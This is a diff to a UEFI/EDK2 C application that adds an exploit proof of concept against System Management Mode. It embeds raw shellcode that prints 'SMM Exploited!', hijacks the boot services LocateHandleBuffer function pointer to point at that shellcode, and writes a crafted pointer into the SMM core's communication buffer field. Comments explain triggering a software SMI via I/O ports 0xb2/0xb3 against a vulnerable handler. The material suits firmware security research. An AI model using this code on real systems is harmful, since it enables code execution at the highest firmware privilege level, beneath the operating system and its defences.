@@ -22,6 +22,59 @@
 
 #include <Guid/SmiHandlerProfile.h>
 
+const CHAR16 *memorymap_types[] = {
+	L"EfiReservedMemoryType",
+	L"EfiLoaderCode",
+	L"EfiLoaderData",
+	L"EfiBootServicesCode",
+	L"EfiBootServicesData",
+	L"EfiRuntimeServicesCode",
+	L"EfiRuntimeServicesData",
+	L"EfiConventionalMemory",
+	L"EfiUnusableMemory",
+	L"EfiACPIReclaimMemory",
+	L"EfiACPIMemoryNVS",
+	L"EfiMemoryMappedIO",
+	L"EfiMemoryMappedIOPortSpace",
+	L"EfiPalCode",
+	L"EfiPersistentMemory"
+};
+
+const CHAR16* memmap_type_to_str(UINT32 memmap_type){
+	if (memmap_type > 14){
+		return L"invalid type";
+	};
+	return memorymap_types[memmap_type];
+}
+
+void hook_gbs_func(void **vuln_func, void* shellcode){
+	*vuln_func=shellcode;
+}
+
+
+/****************************************************************************************
+*
+* Redefinition of memcpy from this part of edk2 codebase:
+*
+* for use in CopyMem call in exploit	
+*
+*****************************************************************************************/
+typedef __SIZE_TYPE__ size_t;
+static void __memcpy(
+	void *dst,
+	const void *src,
+	size_t n
+)
+{
+	unsigned char *d;
+	unsigned char const *s;		
+	d = dst;
+	s = src;
+	while (n-- != 0){
+		*d++ = *s++;
+	}
+}
+
 
 EFI_STATUS
 EFIAPI
@@ -251,8 +304,6 @@ EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL)
 	EFI_STATUS status;
 	//EFI_HANDLE *handlebuffer;
 	//UINTN handle_count;
-	EFI_ACPI_SDT_PROTOCOL *efi_acpi_sdt_protocol;	
-	EFI_GUID acpi_sdt_guid = EFI_ACPI_SDT_PROTOCOL_GUID;
 
 	/*Variables used for gBS->MemoryMap call and memory parsing for smmc*/
 	UINTN MemoryMapSize = 0;
@@ -270,12 +321,17 @@ EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL)
 	void* hooked_fcn_oep = NULL;
 	UINT64 hooked_fcn_oep_addr = 0;
 
+	//UINTN shellcode_payload_sz = 140;
+	//UINTN shellcode_final_sz = shellcode_payload_sz + 5;
+	UINT8 shellcode[] = {0x54, 0x55, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x4A, 0x40, 0xC7, 0x45, 0xC0, 0x53, 0x00, 0x4D, 0x00, 0xC7, 0x45, 0xC4,  0x4D, 0x00, 0x20, 0x00, 0xC7, 0x45, 0xC8, 0x45, 0x00, 0x78, 0x00, 0xC7, 0x45, 0xCC, 0x70, 0x00,  0x6C, 0x00, 0xC7, 0x45, 0xD0, 0x6F, 0x00, 0x69, 0x00, 0xC7, 0x45, 0xD4, 0x74, 0x00, 0x65, 0x00,  0x48, 0xB8, 0x64, 0x00, 0x21, 0x00, 0x0A, 0x00, 0x0D, 0x00, 0x48, 0x89, 0x45, 0xD8, 0x48, 0x8D,  0x55, 0xC0, 0x48, 0x8B, 0x41, 0x08, 0xFF, 0xD0, 0xEB, 0x00, 0x48, 0x81, 0xC4, 0x00, 0x02, 0x00,  0x00, 0x48, 0x89, 0xEC, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A,  0x41, 0x59, 0x41, 0x58, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58, 0x5D, 0x5C, 0xC3, 0x00, 0x00, 0x00}; 
 
 	/* Variables used for ACPI table parsing*/
-	EFI_ACPI_SDT_HEADER *efi_acpi_table;	
-	EFI_ACPI_TABLE_VERSION version;
-	UINTN index = 0;
-	UINTN tablekey;
+	//EFI_ACPI_SDT_PROTOCOL *efi_acpi_sdt_protocol;	
+	//EFI_GUID acpi_sdt_guid = EFI_ACPI_SDT_PROTOCOL_GUID;
+	//EFI_ACPI_SDT_HEADER *efi_acpi_table;	
+	//EFI_ACPI_TABLE_VERSION version;
+	//UINTN index = 0;
+	//UINTN tablekey;
 	
 	Print(L"EFI SYSTEM TABLE pointer address: %p \n", &SystemTable);
 	Print(L"EFI BOOT SERVICES TABLE pointer  address is: %p \n\n", &gBS);	
@@ -333,14 +389,104 @@ EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL)
 		}
 
 	}
-	Print(L"potentital smmc found at: %p \n", smmc_loc);
-	hooked_fcn_oep = &(gBS->LocateHandleBuffer);
-	hooked_fcn_oep_addr = (UINT64)*(gBS->LocateHandleBuffer);
 
+
+/*
+* Chipsec Reference: 
+https://github.com/chipsec/chipsec/blob/main/chipsec/hal/interrupts.py#L148
+
+#define SMM_CORE_PRIVATE_DATA_SIGNATURE  SIGNATURE_32 ('s', 'm', 'm', 'c')
+ struct {
+  UINTN                           Signature;
+   This field is used by the SMM Communicatioon Protocol to pass a buffer into
+   a software SMI handler and for the software SMI handler to pass a buffer back to
+   the caller of the SMM Communication Protocol.
+  VOID                            *CommunicationBuffer;
+  UINTN                           BufferSize;
+
+  EFI_STATUS                      ReturnStatus;
+} SMM_CORE_PRIVATE_DATA;#define SMM_CORE_PRIVATE_DATA_SIGNATURE  SIGNATURE_32 ('s', 'm', 'm', 'c')
+ struct {
+  UINTN                           Signature;
+   This field is used by the SMM Communicatioon Protocol to pass a buffer into
+   a software SMI handler and for the software SMI handler to pass a buffer back to
+   the caller of the SMM Communication Protocol.
+  VOID                            *CommunicationBuffer;
+  UINTN                           BufferSize;
+
+  EFI_STATUS                      ReturnStatus;
+} SMM_CORE_PRIVATE_DATA;
+
+
+
+Also these lines for the memory offsets:
+[Reference: https://github.com/chipsec/chipsec/blob/main/chipsec/hal/interrupts.py#L161
+
+data_hdr = guid_b + struct.pack("Q", payload_sz) + payload
+        # write payload to payload_loc
+        CommBuffer_offset = 56
+        BufferSize_offset = CommBuffer_offset + 8
+        ReturnStatus_offset = BufferSize_offset + 8
+
+
+so we know the following:
+- CommBuffer location == smmc_loc + 56
+- BufferSize location == smmc_loc + 64
+
+
+SMI subfunction triggers when CommBuffer[0] == 1
+So write 0x1 to smmc_loc + 56
+and write 0x1 (buffersize) to smmc_loc + 64
+
+
+Then trigger SWSMI with writing to IO Port 0xb2 and 0xb3 with an outbyte
+0x0 to both ports should suffice
+
+
+
+
+*/
+	gBS->FreePool(MemoryMap);
+	smmc_loc=RtCodeStart+rtcode_offset;
+	Print(L"potentital smmc found at: %p \n", smmc_loc);
+	Print(L"potentital smmc found at: %p \n", RtCodeStart+rtcode_offset);
+	hooked_fcn_oep = &(gBS->LocateHandleBuffer);
+	hooked_fcn_oep_addr = (UINT64)**(gBS->LocateHandleBuffer);
+	EFI_GUID VulnerableSmiHandlerGuid = gEfiSmmCommunicationProtocolGuid;
+	EFI_SMM_COMMUNICATE_HEADER *SmmCommBuff = NULL;
+	UINTN CommBuff_sz = 0;
+	UINT64 shellcode_addr=(unsigned long long)&shellcode;
+	UINT8 shellcode_adr_arr[8];
 	Print(L"Vulnerable gBS functionpointer is at offset: %016llx \n", &hooked_fcn_oep);
 	Print(L"Vulnerable gBS function handler is at address: %p \n", hooked_fcn_oep_addr);
+	//UINT8 smm_comm_buffer[] = {0x1, 0x1};
+	EFI_PHYSICAL_ADDRESS smm_comm_buffer_offset = smmc_loc + 56;
+
+	status=gBS->AllocatePool(
+			EfiRuntimeServicesData,
+			CommBuff_sz,
+			(void**)&SmmCommBuff);
+	Print(L"Newly allocated Smm Comm Buffer is at %p \n", SmmCommBuff);
+	CopyGuid((void*)&SmmCommBuff->HeaderGuid, (void*)&VulnerableSmiHandlerGuid); 
+	Print(L"potentital smm Comm Buffer offset address:: %p \n", smm_comm_buffer_offset);
+	CopyMem((void*)smm_comm_buffer_offset, (void*)&SmmCommBuff, 8);
 	
-	status= gBS->LocateProtocol(
+		
+	Print(L"Shellcode address: %p \n", shellcode);
+	__memcpy(shellcode_adr_arr, &shellcode_addr, sizeof(UINT64));
+	CopyMem((void*)(&(gBS->LocateHandleBuffer)), (void*)shellcode_adr_arr, 8);
+	
+	Print(L"Testing .... confirming gBS function pointer LocateHandleBuffer now points to shellcode at: %p \n", gBS->LocateHandleBuffer);
+	hook_gbs_func((void**)&(gBS->LocateHandleBuffer), (void*)hooked_fcn_oep_addr);
+	Print(L"Testing .... confirming gBS function pointer LocateHandleBuffer again points to original address of LocateHandleBuffer at: %p \n", *(&(gBS->LocateHandleBuffer)));
+
+
+	/************************************************************************************
+	*	UEFI ACPI SDT Manipulation routines
+	*
+	*
+	***********************************************************************************/
+	/*status= gBS->LocateProtocol(
 		&acpi_sdt_guid,
 		NULL,
 		(void **)&efi_acpi_sdt_protocol
@@ -372,13 +518,15 @@ EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL)
 		}
 		index++;
 	}
-
+	*/
 	
 	EFI_SMM_COMMUNICATION_PROTOCOL *smmCommProtocol = NULL;	
 	//EFI_SMM_BASE_PROTOCOL *smmBaseProtocol = NULL;	
 	if ((status = gBS->LocateProtocol(&gEfiSmmCommunicationProtocolGuid, NULL, (VOID **)&smmCommProtocol)) == EFI_SUCCESS){
 		Print(L"Smm Communication Protocol located at: %p \n", smmCommProtocol);
 	}
+	
+	
 	return status;		
 }
 
